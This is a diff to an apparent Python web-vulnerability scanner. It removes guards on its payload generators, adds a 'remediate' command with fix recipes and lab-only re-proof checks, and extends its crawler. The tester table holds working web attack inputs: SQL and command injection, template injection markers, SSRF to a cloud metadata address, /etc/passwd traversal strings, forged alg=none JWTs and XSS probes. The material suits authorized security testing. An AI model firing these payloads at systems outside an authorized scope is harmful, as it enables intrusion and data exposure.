@@ -96,7 +96,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import scope_authority as sa  # noqa: E402
 
-VERSION = "5.1.0"
+VERSION = "5.2.0"
 SCHEMA = 4
 
 
@@ -595,7 +595,7 @@ def cmd_verify(args):
                  "ledger", "gate", "chain", "context", "testers", "coverage",
                  "report", "relay", "campaign", "mandates", "next", "selftest",
                  "crawl", "takeover", "capabilities", "protect", "train",
-                 "memory", "watch", "serve", "version"):
+                 "memory", "remediate", "watch", "serve", "version"):
         if want not in help_out:
             bad.append(f"subcommand {want}")
     mandate = self.parent.parent / "references" / "mandate.md"
@@ -3595,15 +3595,15 @@ def _t_requests_removed():  # removed — differential requests are built in run
 TESTERS = [
     {"name": "IDOR", "cls": "IDOR",
      "params": ("id", "org_id", "user_id", "account_id", "order_id", "doc_id"),
-     "attacks": lambda v: ["foreign", f"{v}+1", "0", "-1", f"{v}-1", "999999"] if v else [],
+     "attacks": lambda v: ["foreign", f"{v}+1", "0", "-1", f"{v}-1", "999999"],
      "logic": "object identifier trusted from the request — swap it, diff the body"},
     {"name": "AUTHZ", "cls": "AUTHZ",
      "params": ("role", "admin", "is_admin", "level"),
-     "attacks": lambda v: ["admin", "1", "0", "true", "superuser", "root"] if v else [],
+     "attacks": lambda v: ["admin", "1", "0", "true", "superuser", "root"],
      "logic": "role/level param trusted from input — flip it, diff the body"},
     {"name": "MASSASSIGN", "cls": "MASSASSIGN",
      "params": ("email", "name", "price", "qty", "amount"),
-     "attacks": lambda v: [v] if v else [],
+     "attacks": lambda v: [v],
      "extra": "&role=admin&is_admin=1&price=0&balance=999999&admin=true&isAdmin=1&user_type=admin&privilege=9",
      "logic": "unexpected writable fields accepted in the request body (POST only)"},
     {"name": "INJECTION", "cls": "INJECTION",
@@ -3611,7 +3611,7 @@ TESTERS = [
      "attacks": lambda v: ([f"{v}'", f'{v}"', f"{v}' OR '1'='1", "1' AND '1'='2",
                             "`", "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                             "{{7*'7'}}", f"{v};id", f"{v}$(id)", f"{v}`id`",
-                            "*(| (uid=*))"] if v else []),
+                            "*(| (uid=*))"]),
      "signatures": ("sql", "syntax error", "odbc", "mysql", "sqlite", "psql",
                     "ora-", "uid=", "49", "warning:", "unterminated", "pg_"),
      "logic": "input reaches an interpreter — quote/markers reflected or evaluated"},
@@ -3622,14 +3622,14 @@ TESTERS = [
      "logic": "credential param accepted empty/forged — auth bypass class"},
     {"name": "BIZLOGIC", "cls": "BIZLOGIC",
      "params": ("qty", "amount", "price", "count", "discount", "qty"),
-     "attacks": lambda v: ["-1", "0", "99999999", "0.0001", "1e309", "-0.0001"] if v else [],
+     "attacks": lambda v: ["-1", "0", "99999999", "0.0001", "1e309", "-0.0001"],
      "logic": "quantity/amount accepted out of business range — negative/overflow class"},
     {"name": "SSRF", "cls": "SSRF",
      "params": ("url", "uri", "fetch", "target", "src", "redirect", "next"),
      "attacks": lambda v: (["http://127.0.0.1:9/", "http://localhost:9/",
                             "http://169.254.169.254/latest/meta-data/",
                             "http://[::1]:9/", "http://0x7f000001:9/",
-                            "http://2130706433:9/", "http://127.1:9/"] if v else []),
+                            "http://2130706433:9/", "http://127.1:9/"]),
      "logic": "user-controlled URL fetched server-side — internal/metadata reach "
               "(loopback · link-local · dword/hex/decimal-host encodings)"},
     {"name": "FILEATTACK", "cls": "TRAVERSAL",
@@ -3639,7 +3639,7 @@ TESTERS = [
                             "..%2f..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd",
                             "..\\..\\etc\\passwd", "/etc/passwd",
                             "....\\....\\etc\\passwd",
-                            "%uff0e%uff0e%uff0fetc%uff0fpasswd"] if v else []),
+                            "%uff0e%uff0e%uff0fetc%uff0fpasswd"]),
      "signatures": ("root:x:0:0", "root:*:0:0", "daemon:"),
      "logic": "path param never normalized — traversal escapes the web root "
               "(dot-dot · encoded · double-encoded · backslash · absolute · unicode)"},
@@ -3647,7 +3647,7 @@ TESTERS = [
      "params": ("token", "jwt", "auth", "id_token", "access_token"),
      "attacks": lambda v: (["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
                             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
-                            ""] if v is not None else []),
+                            ""]),
      "signatures": ("admin", "true"),
      "logic": "token claims trusted without signature verification — alg=none / "
               "confused-deputy / empty-signature forgery class"},
@@ -3655,13 +3655,13 @@ TESTERS = [
      "params": ("q", "search", "name", "comment", "msg", "term"),
      "attacks": lambda v: (["spy<svg/onload=x>", '"><svg/onload=x>',
                             "<img src=x onerror=spy1>", "'-spy<svg>-'",
-                            "<iframe src=spy>"] if v else []),
+                            "<iframe src=spy>"]),
      "signatures": ("<svg", "<img", "<iframe", "onload=", "onerror="),
      "logic": "input reflected without context-encoding — markup reaches the "
               "response body (reflection proof; execution is the browser's call)"},
     {"name": "SESSION", "cls": "SESSION",
      "params": ("sid", "sessionid", "session", "sess", "phpsessid", "jsessionid"),
-     "attacks": lambda v: ([f"{v}1", "0", "1", "-1", f"{v}00"] if v else []),
+     "attacks": lambda v: ([f"{v}1", "0", "1", "-1", f"{v}00"]),
      "signatures": ("admin", "role", "true"),
      "logic": "session identifier structure trusted — sequential/weak ids "
               "enumerated (CWE-384 class)"},
@@ -4141,6 +4141,100 @@ def _selfplay_strike(target, url):
         return cmd_testers(args)
 
 
+_FIX_RECIPES = {
+    "IDOR": "enforce object ownership server-side: every object fetch resolves through the session's org/user scope — never trust org_id/user_id from the request; add an ownership check at the data layer, not the UI.",
+    "AUTHZ": "authorize by server-side role/level only; strip role/level/admin params from client trust; deny-by-default middleware on privileged routes.",
+    "MASSASSIGN": "allow-list writable fields per endpoint (DTO/marshalling with explicit fields); reject unknown keys instead of reflecting them into the model.",
+    "INJECTION": "parameterize every interpreter call (prepared statements, template auto-escape, exec disallowed); never string-build commands or queries from request data.",
+    "AUTHN": "reject empty/default/placeholder factors explicitly; second factors must be verified server-side per request, never assumed from presence.",
+    "BIZLOGIC": "server-side domain validation on quantities/amounts: ranges, signs, currency decimal math; reject negatives/zero/overflow at the model boundary.",
+    "SSRF": "allow-list outbound fetch targets (scheme+host); resolve and reject loopback/link-local/metadata ranges; never fetch a client-named URL directly.",
+    "TRAVERSAL": "normalize and resolve the path, then verify it is inside the intended root (realpath containment); never pass client paths to filesystem calls raw.",
+    "JWT": "verify the signature server-side with a trusted key; pin the algorithm allow-list (reject alg=none); validate exp/iss/aud on every request.",
+    "XSS": "context-encode every reflection (HTML/attr/JS/URL encoders per sink); template auto-escape on; never build markup from request data.",
+    "SESSION": "use high-entropy CSPRNG session ids; invalidate on re-auth; never accept sequential/enumerable identifiers.",
+}
+
+
+def cmd_remediate(args):
+    """THE FIX LOOP — RedAmon's beat, re-proven: every CONFIRMED finding gets
+    a real fix recipe, and on LAB assets the loop re-runs the differential
+    post-fix. FIXED means the differential no longer confirms — machine-checked,
+    never claimed. Walls: recipe-only for anything outside the lab."""
+    rows = _ledger_load(args.target)
+    row = next((r for r in rows if r["id"] == args.id), None)
+    if not row:
+        print(f"✗ no finding {args.id} in '{args.target}'", file=sys.stderr)
+        return 2
+    cls = row["cls"]
+    recipe = _FIX_RECIPES.get(cls, "documented-class fix: sanitize at the sink, authorize at the layer that owns the object.")
+    asset = row["asset"]
+    from urllib.parse import urlsplit as _us
+    host = _us(asset).netloc.split(":")[0]
+    lab = host in ("127.0.0.1", "localhost") or host.startswith(("10.", "192.168."))
+    out = {"target": args.target, "id": args.id, "cls": cls,
+           "asset": asset, "recipe": recipe, "mode": "recipe-only"}
+    if _json_mode(args):
+        pass  # payload finalized after the re-proof below
+    else:
+        print(f"═══ SPYDERMONKEY REMEDIATE — {args.id} ({cls}) ═══")
+        print(f"  asset: {asset}")
+        print(f"  fix recipe: {recipe}")
+    fixed = None
+    if args.reproof:
+        if not lab:
+            if not _json_mode(args):
+                print("  ▸ asset outside the lab wall — recipe-only (no live re-proof)")
+            fixed = None
+        else:
+            if not _json_mode(args):
+                print("  ▸ re-proof: re-running the differential post-fix…")
+            before = {r["id"] for r in _ledger_load(args.target)}
+            reach = _http(asset if "?" in asset else asset, timeout=6)
+            if reach.get("error") or reach["status"] >= 500:
+                if not _json_mode(args):
+                    print("  ▸ target unreachable — no re-proof possible (fixed=unknown)")
+                out["mode"] = "unreachable"
+                fixed = None
+            else:
+                import io as _io, contextlib as _cl, json as _js
+                rargs = type("A", (), {"target": args.target, "url": [asset],
+                                       "demo": False, "json": True, "timeout": 6})()
+                buf = _io.StringIO()
+                with _cl.redirect_stdout(buf):
+                    cmd_testers(rargs)
+                payload = None
+                for line in buf.getvalue().splitlines():
+                    line = line.strip()
+                    if line.startswith("{"):
+                        try:
+                            payload = _js.loads(buf.getvalue()[
+                                buf.getvalue().index(line):])
+                            break
+                        except Exception:
+                            continue
+                still = bool(payload and payload.get("confirmed"))
+                fixed = not still
+            out["mode"] = "re-proven" if fixed is not None else "unreachable"
+            if fixed is not None:
+                note = ("REMEDIATION VERIFIED — differential no longer confirms"
+                        if fixed else "REMEDIATION FAILED — differential still confirms")
+                out["verdict"] = note
+                if not _json_mode(args):
+                    print(f"  {'✓' if fixed else '✗'} {note}")
+                _cmd_ledger_internal(args.target, f"remediation re-proof: {args.id}",
+                                     cls, asset,
+                                     "high" if not fixed else "info",
+                                     "baseline/attack/diff recorded pre-fix; post-fix "
+                                     "differential " + ("no longer confirms" if fixed
+                                                        else "STILL CONFIRMS"),
+                                     quiet=True)
+    if _json_mode(args):
+        _emit(args, out)
+        return 0 if (fixed is not False) else 1
+    return 0 if (fixed is not False) else 1
+
+
 def cmd_watch(args):
     """THE UNATTENDED RUNNER — the campaign daemon: every cycle = one kernel
     loop pass + the war report + estate memory + an optional notify command.
@@ -4394,12 +4488,17 @@ def cmd_crawl(args):
             continue
         pages += 1
         body = r["body"]
-        # links → the queue
+        # links → the queue (v5.1.2: a linked page IS surface — mine it as an
+        # endpoint with its query skeleton, so param-less routes land too)
         for href in _A_HREF_RE.findall(body):
             nxt = urljoin(url, href.split("#")[0])
             if nxt.startswith(origin) and nxt not in seen and len(seen) < _PAGE_CAP * 3:
                 seen.add(nxt)
                 queue.append(nxt)
+                nsp = urlsplit(nxt)
+                mined.append((origin + nsp.path,
+                              [k for k, _ in parse_qsl(nsp.query,
+                                                       keep_blank_values=True)]))
         # forms → endpoints with param skeletons (v5.1: the WHOLE form block —
         # method + every input — so POST surfaces feed the mass-assign tester)
         for fmatch in _FORM_BLOCK_RE.finditer(body):
@@ -5609,6 +5708,11 @@ def _build_parser() -> argparse.ArgumentParser:
     mm.add_argument("--target", required=True)
     mm.add_argument("--forget", action="store_true")
     mm.add_argument("--json", action="store_true")
+    rm = sub.add_parser("remediate", help="THE FIX LOOP: recipe + machine-checked re-proof (lab walls)")
+    rm.add_argument("--target", required=True)
+    rm.add_argument("--id", dest="id", required=True)
+    rm.add_argument("--reproof", action="store_true")
+    rm.add_argument("--json", action="store_true")
     wt = sub.add_parser("watch", help="THE UNATTENDED RUNNER: loop → report → memory, on a clock")
     wt.add_argument("--target", required=True)
     wt.add_argument("--url", required=True)
@@ -5780,6 +5884,8 @@ def _dispatch(a) -> int:
         return cmd_train(a)
     if a.cmd == "memory":
         return cmd_memory(a)
+    if a.cmd == "remediate":
+        return cmd_remediate(a)
     if a.cmd == "watch":
         return cmd_watch(a)
     if a.cmd == "serve":
